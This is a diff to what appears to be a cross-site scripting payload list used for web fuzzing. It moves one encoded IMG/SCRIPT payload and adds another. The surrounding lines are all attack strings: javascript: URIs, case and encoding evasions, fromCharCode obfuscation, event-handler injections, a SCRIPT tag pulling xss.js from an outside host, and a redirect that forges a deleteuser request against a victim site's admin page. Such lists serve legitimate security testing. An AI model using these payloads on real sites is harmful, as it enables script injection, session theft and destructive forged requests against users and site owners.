@@ -5,13 +5,13 @@
 <IMG SRC=javascript:alert("XSS")>
 <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG%20"""><SCRIPT>alert("XSS")</SCRIPT>">
 <SCRIPT%20SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <IMG%20SRC="javascript:alert('XSS');">
 <IMG%20SRC=javascript:alert('XSS')>
 <IMG%20SRC=JaVaScRiPt:alert('XSS')>
 <IMG%20SRC=javascript:alert("XSS")>
 <IMG%20SRC=`javascript:alert("RSnake says, 'XSS'")`>
-<IMG%20"""><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 <IMG SRC=javascript:alert('XSS')>
 <IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
@@ -443,3 +443,4 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
 <b onload="alert(1)">Document Title</b>
 <span onerror="alert(1)">text within a SPAN tag</span>
 "><script>alert(/31ric.com/)</script>
+"><SCRIPT>alert('XSS%20Testing')</SCRIPT>
